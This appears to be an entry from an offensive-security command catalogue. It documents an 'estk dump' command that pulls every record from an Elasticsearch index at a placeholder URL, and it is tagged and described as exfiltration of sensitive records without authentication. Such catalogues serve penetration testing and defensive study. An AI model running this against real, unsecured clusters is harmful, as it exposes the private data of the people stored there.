---
data: 'estk dump --url=https://elasticsearch.example.com:9200 --index=aim_high'
tags:
  - elasticsearch
  - exfiltration
type: command
output: Index data displayed in JSON format on standard output
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-30T00:00:00Z'
updated_at: '2025-12-14T17:31:19.275Z'
id: d6792072-9a25-464d-abed-e55168898ad2
verified: false
validated: true
submitted: true
---
# estk-dump-index

## Command

```bash
estk dump --url=https://elasticsearch.example.com:9200 --index=aim_high
```

## Description

Dumps all data from the specified Elasticsearch index in JSON format, allowing exfiltration of sensitive records without authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--url` | Specifies the target Elasticsearch URL | Yes |
| `--index` | Targets the specific index (e.g., aim_high) for data extraction | Yes |
| `dump` | Subcommand to export index contents | Yes |

## Examples

### Basic Usage

```bash
estk dump --url=https://elasticsearch.example.com:9200 --index=aim_high
```

### Advanced Usage

```bash
estk dump --url=https://elasticsearch.example.com:9200 --index=aim_high > data.json
```
(Redirect to file for storage)

## Expected Output

Raw JSON documents from the index, e.g., array of records with fields like timestamps, user data, etc.

## Related

- [[Related Procedure: Extract-Data-from-Elasticsearch-Index-with-estk]]
